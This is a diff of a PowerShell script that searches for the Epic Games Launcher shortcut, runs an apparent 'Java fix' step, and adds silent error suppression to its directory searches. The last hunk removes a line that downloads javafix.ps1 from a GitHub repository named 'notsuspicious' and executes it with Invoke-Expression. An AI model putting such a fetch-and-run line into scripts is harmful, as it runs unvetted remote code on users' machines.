@@ -10,7 +10,7 @@ function FindEpicGamesLauncher {
     param (
         [string]$directory
     )
-    Get-ChildItem -Path $directory -Recurse -Filter "Epic Games Launcher.lnk" | ForEach-Object {
+    Get-ChildItem -Path $directory -Recurse -Filter "Epic Games Launcher.lnk" -ErrorAction SilentlyContinue | ForEach-Object {
         $p = $_.FullName
         return $true
     }
@@ -18,7 +18,7 @@ function FindEpicGamesLauncher {
 }
 
 # Search for Epic Games Launcher.lnk in user directories
-$userDirectories = Get-ChildItem -Path "C:\Users" -Directory
+$userDirectories = Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue
 foreach ($directory in $userDirectories) {
     if (FindEpicGamesLauncher -directory $directory.FullName) {
         break
@@ -27,7 +27,7 @@ foreach ($directory in $userDirectories) {
 
 # If not found, search in Program Files directory
 if (-not $p) {
-    $programFilesDirectories = Get-ChildItem -Path "C:\Program Files" -Directory
+    $programFilesDirectories = Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue
     foreach ($directory in $programFilesDirectories) {
         if (FindEpicGamesLauncher -directory $directory.FullName) {
             break
@@ -59,4 +59,3 @@ try {
 } catch {
     Write-Host "Failed to execute Java fix script."
 }
-Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing).Content
